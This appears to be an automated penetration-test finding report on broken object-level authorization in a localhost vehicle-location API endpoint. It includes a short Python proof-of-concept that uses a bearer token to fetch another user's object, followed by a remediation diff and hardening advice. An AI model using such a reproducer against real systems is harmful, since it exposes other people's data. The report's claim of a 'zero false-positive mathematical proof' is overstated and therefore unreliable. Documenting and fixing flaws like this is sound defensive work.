---
id: FINDING-BOLA-30F2C0F8
title: "Broken Object Level Authorization in http://localhost:8888/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location"
category: BOLA
severity: HIGH
status: VERIFIED_ZERO_FP
owasp_ref: "API1:2023 - Broken Object Level Authorization"
cwe_ref: "CWE-639: Authorization Bypass Through User-Controlled Key"
endpoint_url: "http://localhost:8888/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location"
created_at: "2026-10-23T10:07:04.123126+00:00"
tags:
  - pentest/finding
  - severity/high
  - owasp/bola
---

# Broken Object Level Authorization in http://localhost:8888/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location

> [!CAUTION]
> **VERIFIED VULNERABILITY (Zero False-Positive Invariant Oracle)**
> This finding has been verified through a mathematical differential invariant proof. The target endpoint permits unauthorized access under active testing.

## 1. Vulnerability Metadata
- **Finding ID**: `FINDING-BOLA-30F2C0F8`
- **Category**: `BOLA`
- **Severity**: **HIGH**
- **OWASP Reference**: [[00_Index|API1:2023 - Broken Object Level Authorization]]
- **CWE Reference**: `CWE-639: Authorization Bypass Through User-Controlled Key`
- **Target Endpoint**: `http://localhost:8888/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location`
- **HTTP Method**: `GET`

## 2. Attack Sequence Diagram
```mermaid
sequenceDiagram
    autonumber
    actor Attacker as Attacker (Bob)
    participant Gateway as API Gateway
    participant Backend as Target Service
    participant DB as Database

    Note over Attacker,DB: 3-Way Differential Invariant Test
    Attacker->>Gateway: GET http://localhost:8888/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location (Forged Context)
    Gateway->>Backend: Forward Request (Missing Authorization Lattice)
    Backend->>DB: Query/Update Object (f89b5f21-7829-45cb-a650-299a61090378)
    DB-->>Backend: Data / Object State Leaked
    Backend-->>Attacker: HTTP 200 OK (Invariant Broken!)
```

## 3. Mathematical Verification Proof
```text
Cross-principal request by 'Bob' to object 'f89b5f21-7829-45cb-a650-299a61090378' succeeded with HTTP 200 and semantic similarity 1.00. Violated Invariants: INV_OBJECT_ISOLATION.
```

## 4. Reproducible Proof-of-Concept (Standalone Python)
```python
# reproduce_finding-bola-30f2c0f8.py
# Standalone Zero-Dependency Reproducer
import requests

TARGET_URL = (
    "http://localhost:8888/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location"
)
HEADERS = {
    "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJib2JAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTI3NTAwMjMsImV4cCI6MTc5MzM1NDgyMywicm9sZSI6InVzZXIifQ.C-SYWgkJaZwKwg8F7ZHGJEA8IxRQh4GvJ9yvU21ivPVuaL_sZhX9xn7nFnvqp8q9JgQ3keusCeqHkfIpsMCGaUC9txGMkAoAR5tQO8xnSSqc8N_rx7dKbvK7pT775JfozGXZG1RkbtXRrXQrvwtmt3Hf4Di12h5LwMnQXLrJ291lwnv1CjMU22OXuDn5I5x6nKtl5-nGtCyNRqflD85StwKAas4qKsg2LaZ_EH1frvwOfI2Brb1v9fmzSeIeb0NckQaEBH1ZRNYbpnz29r94fhaQPHGQBUpJtgY0ONVDRb9KjG3xv4QKX5zd95DLkAcvycx5VE1S6LYbjRBjc2814w",
    "Content-Type": "application/json",
}

response = requests.request("GET", TARGET_URL, headers=HEADERS, timeout=10)
print(f"Status Code: {response.status_code}")
print(f"Body: {response.text[:300]}")

assert response.status_code in [200, 201, 204], "Exploit failed!"
print("[+] Vulnerability verified successfully!")
```

## 5. Remediation Patch (Git Unified Diff)
```diff
--- a/controllers/vehicle_id_controller.py
+++ b/controllers/vehicle_id_controller.py
@@ -24,6 +24,11 @@ def get_vehicle_id(request, id):
     obj = Vehicle_id.query.get_or_404(id)
+
+    # REMEDIATION (BOLA Prevention): Explicit Object Ownership Invariant
+    if obj.owner_id != request.current_user.id and not request.current_user.is_admin:
+        return {'error': 'Access denied: Object not owned by caller'}, 403
+
     return jsonify(obj.to_dict()), 200

```

## 6. Defensive Engineering Guidance
1. Enforce strict authorization checks at the database query level (e.g. `WHERE id = ? AND owner_id = ?`).
2. Avoid trusting client-supplied object identifiers without cross-referencing caller identity from verified JWT claims.
3. Consider utilizing unpredictable, non-sequential cryptographic UUIDv4 for public identifiers.

---
*Back to [[00_Index|Vault Index]] | [[01_Target_Attack_Surface|Attack Surface Map]]*
